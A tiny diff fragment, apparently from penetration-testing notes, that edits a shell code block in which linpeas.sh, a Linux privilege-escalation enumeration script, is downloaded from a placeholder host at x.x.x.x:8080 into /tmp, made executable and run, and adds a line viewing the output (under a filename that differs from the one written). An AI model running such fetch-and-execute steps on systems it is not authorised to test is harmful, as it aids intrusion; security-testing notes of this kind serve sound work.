@@ -21,4 +21,5 @@ cd /tmp
 wget x.x.x.x:8080/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh -a > ./output.txt
+less -r ./linpeas.txt
 ```
